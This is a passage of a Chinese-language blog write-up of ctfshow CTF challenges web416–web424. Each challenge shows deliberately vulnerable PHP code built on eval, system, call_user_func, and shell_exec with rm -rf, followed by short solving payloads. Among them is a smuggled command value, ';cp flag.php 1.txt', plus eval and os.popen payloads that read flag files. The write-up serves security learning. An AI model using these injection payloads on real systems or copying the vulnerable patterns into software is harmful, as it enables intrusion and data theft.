+<h3 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br><br>class ctf&#123;<br>    public function getflag()&#123;<br>        return &#x27;fake flag&#x27;;<br>    &#125;<br>    final public function flag()&#123;<br>        echo file_get_contents(&#x27;flag.php&#x27;);<br>    &#125;<br>&#125;<br><br>class show extends ctf&#123;<br>    public function __construct($f)&#123;<br>        call_user_func($f);<br>    &#125;<br>&#125;<br><br>echo new show($_GET[f]);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">直接调用函数<br>f=ctf::flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">解密出来是这个<br>include(&#x27;flag.php&#x27;);<br>$c=$_GET[&#x27;ctf&#x27;];<br>if($c==&#x27;show&#x27;)&#123;<br>	echo $flag;<br>&#125;else&#123;<br>	echo &#x27;FLAG_NOT_HERE&#x27;;<br>&#125;<br>?&gt;<br>ctf=show<br></code></pre></td></tr></table></figure>
+
+<h3 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>$key= 0;<br>$clear=&#x27;clear.php&#x27;;<br>highlight_file(__FILE__);<br>//获取参数<br>$ctfshow=$_GET[&#x27;ctfshow&#x27;];<br>//包含清理脚本<br>include($clear);<br>extract($_POST);<br>if($key===0x36d)&#123;<br>    //帮黑阔写好后门<br>    eval(&#x27;&lt;?php &#x27;.$ctfshow.&#x27;?&gt;&#x27;);<br>&#125;else&#123;<br>    $die?die(&#x27;FLAG_NOT_HERE&#x27;):clear($clear);<br>&#125;<br><br>function clear($log)&#123;<br>    shell_exec(&#x27;rm -rf &#x27;.$log);<br>&#125;<br><br>FLAG_NOT_HERE<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">整半天进不去eval(),原来是因为$key是string型，在强比较无法等于数字0x36d<br>我们看到还有一个shell_exec() 可以利用,；分开然后写命令<br>die=0&amp;clear=;cp flag.php 1.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>$code = $_POST[&#x27;code&#x27;];<br>if(strlen($code) &lt; 17)&#123;<br>    eval($code);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">只能16个的话<br>code=eval($_POST[1]);&amp;1=system(&#x27;cat f*&#x27;);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>$code = $_POST[&#x27;code&#x27;];<br>if(strlen($code) &lt; 8)&#123;<br>    system($code);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">变7个了但是换成了system()<br>ls和ls /都没有<br>那我们nl ../*<br></code></pre></td></tr></table></figure>
+
+<h3 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>$code = $_POST[&#x27;code&#x27;];<br>if(strlen($code) &lt; 6)&#123;<br>    system($code);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">5个<br>nl f*<br></code></pre></td></tr></table></figure>
+
+<h3 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>$code = $_POST[&#x27;code&#x27;];<br>if(strlen($code) &lt; 5)&#123;<br>    system($code);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">4个。。。<br>nl *<br></code></pre></td></tr></table></figure>
+
+<h3 id="web423"><a href="#web423" class="headerlink" title="web423"></a>web423</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">f12有个参数?code<br>然后就是纯猜，啥都没有<br>?code=os.popen(&quot;cat /f*&quot;).read()<br></code></pre></td></tr></table></figure>
+
+<h3 id="web424"><a href="#web424" class="headerlink" title="web424"></a>web424</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">知道文件名可以直接open<br>?code=open(&#x27;/flag&#x27;).read()<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/" class="category-chain-item">CTF题解</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/ctfshow/" class="category-chain-item">ctfshow</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctfshow/" class="print-no-link">#ctfshow</a>
+      
+        <a href="/tags/SSTI/" class="print-no-link">#SSTI</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ctfshow SSTI 与过滤绕过</div>
+      <div>https://xendr1a.github.io/2025/10/05/ctfshow-ssti/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/14/0xgame2025-week1/" title="0xgame2025 week1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">0xgame2025 week1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/15/ctfshow-rce/" title="ctfshow 命令执行题解">
+                        <span class="hidden-mobile">ctfshow 命令执行题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
